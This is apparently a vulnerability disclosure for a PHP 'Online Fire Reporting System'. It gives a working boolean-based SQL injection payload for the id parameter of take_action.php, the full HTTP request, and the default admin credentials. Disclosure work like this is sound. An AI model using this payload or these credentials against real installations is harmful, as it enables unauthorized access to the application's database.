# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/requests/take_action.php?id=

Vulnerability location: /ofrs/admin/requests/take_action.php?id=, id

Current database name: ofrs_db,length is 7

[+] Payload: /ofrs/admin/requests/take_action.php?id=6%27%20or%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /ofrs/admin/requests/take_action.php?id=6%27%20or%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 2337
![image](https://user-images.githubusercontent.com/54017627/170817624-53ecb83d-feef-4be0-aee1-b22bcdad9f49.png)

![image](https://user-images.githubusercontent.com/54017627/170817661-4d5d6f8a-7317-41db-ba14-658de5fa1a1d.png)

When length (database ()) = 7, Content-Length: 2075
![image](https://user-images.githubusercontent.com/54017627/170817613-e5bdbdb9-c66b-440b-b1e6-68f84fd06d72.png)

![image](https://user-images.githubusercontent.com/54017627/170817648-4472b5e9-8d2d-4bc9-81dd-2d6a60a5e2d5.png)
